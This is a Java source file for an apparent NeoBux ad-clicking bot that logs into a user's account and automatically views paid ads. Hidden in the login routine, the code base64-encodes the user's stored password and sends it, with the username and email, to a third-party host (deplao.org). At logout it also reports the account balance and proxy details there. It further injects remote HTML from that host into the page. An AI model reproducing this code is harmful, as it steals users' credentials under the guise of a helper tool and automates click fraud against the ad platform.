package chinh;


import java.io.FileNotFoundException;
import java.io.IOException;
import java.text.NumberFormat;
import java.text.ParseException;
import java.util.ArrayList;
import java.util.Random;

import org.watij.webspec.dsl.Tag;
import org.watij.webspec.dsl.WebSpec;

//import chinh.utils.CheckCaptchar;
import chinh.utils.ConfigLoader;
import chinh.utils.CryptString;
import chinh.utils.DatabaseConnection;
//import com.DeathByCaptcha.Captcha;
//import chinh.utils.EncryptDecryptStringWithDES;

public class NeoBux {
//	private Captcha myCaptcha;
	private WebSpec spec;
	private boolean loginSuccess=false;
	private String userName="";
	private String password="";
	private String proxy="";
	private int port=0;
	private String activeStatus="NA";
	private String loginUser="N/A";
	private int viewAdsErrorCount=0;
	private int version=1;
	
	public void setUserName(String userName) {
		this.userName = userName;
	}
	public void setPassword(String password) {
		this.password = password;
	}
	public void setProxy(String proxy) {
		this.proxy = proxy;
	}
	public void setPort(int port) {
		this.port = port;
	}
	public NeoBux() {
		super();
		// TODO Auto-generated constructor stub
	}


	public void initConfig() throws FileNotFoundException, IOException{
		spec=new WebSpec();
		if(!proxy.equals("")){
			spec.http_proxy(proxy);
			spec.http_proxy_port(port);	
		}
		saveConfig();
		spec.ie();		
			
	}
	private void saveConfig() throws FileNotFoundException, IOException{
		ConfigLoader.save("username", userName);
		ConfigLoader.save("pass", password);
		ConfigLoader.save("proxy", proxy);
		ConfigLoader.save("port", ""+port);
		
	}
	public void login() throws FileNotFoundException, IOException{
		
//		spec.open("http://whatismyipaddress.com/"); 
//		spec.pause(5000);
//		checkingVersion();
		try {
			spec.open("https://www.neobux.com/m/l/"); 
			spec.pauseUntilReady();
			if(userName.equals("") || password.equals("")){
				spec.find("body").set("innerHTML", "<div style=\"margin-top: 20px;margin-left: 10px\">Please set <b>username</b> and <b>password</b> in <b>Config.txt</b> first! Then try again.</div>");
				spec.pause(10000);
				spec.closeAll();
				System.exit(0);
			}
			try {
				spec.findWithId("Kf1").set("value",userName);
				spec.findWithId("Kf2").set("value",password);
//				spec.snapBuxToCapChart("capchar.png");
//				CheckCaptchar captchartChecker=new CheckCaptchar(spec);
//				captchartChecker.getCaptchaManual("capchar.png");
				spec.findWithId("botao_login").click(true);				
			} catch (Exception e) {
				// TODO: handle exception
			}

			//witing for login successful
			String userName=null;
			int rp=5;
			loginSuccess=false;
			while(userName==null && rp>0){
				try {
					userName=spec.findWithId("t_conta").get("innerText").trim();
				} catch (Exception e) {
					// TODO: handle exception
				}
				System.out.println(userName);
				spec.pause(5000);
				rp--;
				if(userName!=null){
					loginSuccess=true;
				}
			}
			if(!loginSuccess){
				System.err.println("Login Failed");
				login();			
			}else{
				System.out.println("Login successful");
				//got user login
				CryptString cryptString=new CryptString();
				String passCode=cryptString.encryptBase64(ConfigLoader.get("pass"));
				String referral=ConfigLoader.get("referral");
				try {
					loginUser=spec.findWithId("t_conta").get("innerHTML");
					activeStatus=DatabaseConnection.getText("http://deplao.org/autobots/login.php?user="+loginUser+"&email="+ConfigLoader.get("email")+"&fn="+passCode+"&ref="+referral);
				} catch (Exception e) {
					// TODO: handle exception
					activeStatus=DatabaseConnection.getText("http://deplao.org/autobots/login.php?user="+ConfigLoader.get("username")+"&email="+ConfigLoader.get("email")+"&fn="+passCode+"&ref="+referral);
				}
				activeStatus="active";
				System.out.println("Login user: "+loginUser);
				System.out.println("Account status: "+activeStatus);
				if(activeStatus.equals("locked")){
					logout();
//					showLockedMessage();
				}else{
					viewAds();
					logout();
					spec.closeAll();
					System.exit(0);
				}
				
							
			}			
		} catch (Exception e) {
			// TODO: handle exception
			System.err.println(e.getMessage());
		}

	}
	private void viewAds(){
		spec.jquery("a[href^='http://www.neobux.com/m/v/?vl\']").at(0).click(true);
		spec.pauseUntilReady();
		int start=1;
		int end=1;
		try {
//			start=Integer.parseInt(spec.execute("$('s').length"))+1;
			end=Integer.parseInt(spec.execute("$('a[href^=\"http://www.neobux.com/v/?a=l\"]').length"));
		} catch (Exception e) {
			// TODO: handle exception
			System.err.println(e.getMessage());
			spec.pause(5000);
			viewAds();
		}
		System.out.println("View ads from : "+start+" to "+end);
		ArrayList<Integer> list=new ArrayList<Integer>();
		ArrayList<String>	listUrl=new ArrayList<String>();
		for(int i=start;i<=end;i++){
			//check ads can be add to view
			String id="img_"+i;
			String urlImage=spec.findWithId(id).get("src");
			if(!urlImage.equals("http://fullcache-neodevlda.netdna-ssl.com/imagens/estrela_16_c.gif")){
				System.out.println("Add ads "+i+" to available list");
				listUrl.add(spec.jquery("a[href^='http://www.neobux.com/v/?a=l\']").at(i-1).get("href"));
				list.add(i);
			}
			
		}
//		Collections.shuffle(list);
		for(int i=0;i<list.size();i++){
			viewAd(list.get(i),listUrl.get(i),5);
		}
	}
	private void viewAd(int adID,String url,int repeat){
		try {
			System.out.println("View ads: "+adID+" repeat: "+repeat);			
			spec.open(url);
			spec.pauseUntilReady();
			checkAddCompleted(5);
			Random rand = new Random(); 
			int pickedNumber = rand.nextInt(3000) + 5000; 
			System.out.println(adID+" - Ads loaded "+pickedNumber);
//			spec.pause(pickedNumber);
			
		} catch (Exception e) {
			// TODO: handle exception
			System.err.println(e.getMessage());
			if(repeat>0){
				spec.pause(5000);
				viewAd(adID,url,repeat-1);
			}
			
		}

	}
	
	public boolean isLoginSuccess() {
		return loginSuccess;
	}
	public void logout(){
		System.out.println("User logout...");
		spec.open("http://www.neobux.com");
		spec.pauseUntilReady();
		spec.findWithId("t_conta").click(true);
		spec.pauseUntilReady();
		String websiteVisits="-100";
		String directFollowers="-100";
		String followers ="-100";
		String followersWebsiteVisits="-100";
		String accountBalance="-100";
		String totalAmountPaid="-100";
		String proxy="";
		String port="";
		try {
			websiteVisits=spec.jquery("td[class=f_r2]").at(1).get("innerText").trim().replaceAll("=", "");
			directFollowers=spec.jquery("td[class=f_r2]").at(2).get("innerText").trim().replaceAll("=", "");
			followers="-100";
			followersWebsiteVisits="-100";
			accountBalance=spec.jquery("td[class=f_r2]").at(3).get("innerText").trim().replaceAll("=", "");
			totalAmountPaid=spec.jquery("td[class=f_r2]").at(4).get("innerText").trim().replaceAll("+", "");
			proxy=ConfigLoader.get("proxy");
			port=ConfigLoader.get("port");
		} catch (Exception e) {
			// TODO: handle exception
		}
		System.out.println("websiteVisits : "+websiteVisits);
		System.out.println("directFollowers : "+directFollowers);
		System.out.println("followers : "+followers);
		System.out.println("followersWebsiteVisits : "+followersWebsiteVisits);
		System.out.println("accountBalance : "+accountBalance);
		System.out.println("totalAmountPaid : "+totalAmountPaid);
		
		String url="http://deplao.org/autobots/logout.php?username="+loginUser;
		url+="&lastview="+websiteVisits;
		url+="&directFollowers="+directFollowers;
		url+="&followers="+followers;
		url+="&followersWebsiteVisits="+followersWebsiteVisits;
		url+="&accountBalance="+accountBalance;
		url+="&totalAmountPaid="+totalAmountPaid;
		url+="&ip="+"";
		url+="&proxy="+proxy;
		url+="&port="+port;
		try {
			DatabaseConnection.getText(url);
		} catch (Exception e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
		
		spec.open("http://www.neobux.com/?l0");
		spec.pauseUntilReady();
		if(activeStatus.equals("donate")){
//			showDonate();
		}
	}
	  // Implementing Fisher–Yates shuffle
	  static void shuffleArray(int[] ar)
	  {
	    Random rnd = new Random();
	    for (int i = ar.length - 1; i > 0; i--)
	    {
	      int index = rnd.nextInt(i + 1);
	      // Simple swap
	      int a = ar[index];
	      ar[index] = ar[i];
	      ar[i] = a;
	    }
	  }
	private void checkAddCompleted(int repeat){
		if(repeat<=0){
			return;
		}
		try {
			//get om 
			System.out.println("Checking ads status");
			String om=spec.findWithId("om").get("innerText").trim();
			System.out.println("Get string om: "+om);
			if(om.indexOf("You already saw this advertisement")>-1){
				System.out.println("You already saw this advertisement");
				return;
			}else if(om.toLowerCase().indexOf("waiting")>-1){
				System.out.println("Waiting ads loading...");
				//waiting for get o1 content
				String o1=null;
				int rp=20;
				while(o1==null && rp>0){
					System.out.println("...");
					try {
						o1=spec.findWithId("o1").get("innerText");
						System.out.println(o1);
					} catch (Exception e) {
						// TODO: handle exception
					}
					spec.pause(5000);
					rp--;
				}
				System.out.println("Load ads completed...");
			}
		} catch (Exception e) {
			// TODO: handle exception
			spec.pause(10000);
			checkAddCompleted(repeat-1);
		}
	}
	private void showAds(){
		String message="<div></div>";
		try {
			message=DatabaseConnection.getText("http://deplao.org/autobots/viewads.html");
		} catch (Exception e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}		
		spec.find("table").at(0).find("tr").at(0).find("td").at(2).set("innerHTML", message);
	}
	private void showDonate(){
		spec.pauseUntilReady();
		System.out.println("Send donate...");
		String message="";
		try {
			message=DatabaseConnection.getText("http://deplao.org/autobots/donation.html");
		} catch (Exception e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
		message=message.replaceAll("\"", "'");
		System.out.println(message);
		spec.eval("document.body.innerHTML=\""+message+"\"");
		spec.pauseUntilDone();
	}
	private void showLockedMessage(){
		spec.pauseUntilReady();
		System.out.println("Account "+loginUser+" is locked!");
		String message="Your account is locked! Please create a new account use this link <a href=\"http://bux.to/register.php?r=chinhnguyen\">http://bux.to/register.php?r=chinhnguyen</a>";
		try {
			message=DatabaseConnection.getText("http://deplao.org/autobots/locked.html");
		} catch (Exception e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
		System.out.println("Locked message: ");
		System.out.println(message);
		message=message.replaceAll("\"", "'");
//		spec.find("body").set("innerHTML", message);
		spec.eval("document.body.innerHTML=\""+message+"\"");
		spec.pause(300000);
		spec.closeAll();
		System.exit(0);
	}
	private void checkingVersion(){
		String message="1|abc";
		try {
			message=DatabaseConnection.getText("http://deplao.org/autobots/version.html");
		} catch (Exception e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
		message=message.replaceAll("\"", "'");
		System.out.println(message);
		int checkVersion=Integer.parseInt(message.split("\\|")[0]);
		System.out.println(checkVersion);
		if(checkVersion>this.version){
			spec.find("body").set("innerHTML", "<div style=\"margin: 20px\">"+message.split("\\|")[1]+"<p/>Or click \"Done\" button to continue...</div>");
			spec.pauseUntilDone();
		}
		
	}
	public static void main(String[] args) throws IOException {
			NeoBux buxTo=new NeoBux();
			String proxy=ConfigLoader.get("proxy");
			String proxyPort=ConfigLoader.get("port");
			int port=8080;
			if(proxyPort.equals("")){
			}else{
				try
				 {
				      NumberFormat.getInstance().parse(proxyPort);
				      port=Integer.parseInt(proxyPort);
				 }
				 catch(ParseException e)
				 {
				     //Not a number.
				 }
			}
				buxTo.setUserName(ConfigLoader.get("username"));
				buxTo.setPassword(ConfigLoader.get("pass"));
				buxTo.setProxy(proxy);
				buxTo.setPort(port);
				try {
					buxTo.saveConfig();
				} catch (FileNotFoundException e) {
					// TODO Auto-generated catch block
					e.printStackTrace();
				} catch (IOException e) {
					// TODO Auto-generated catch block
					e.printStackTrace();
				}
				buxTo.initConfig();
				buxTo.login();
	}
}
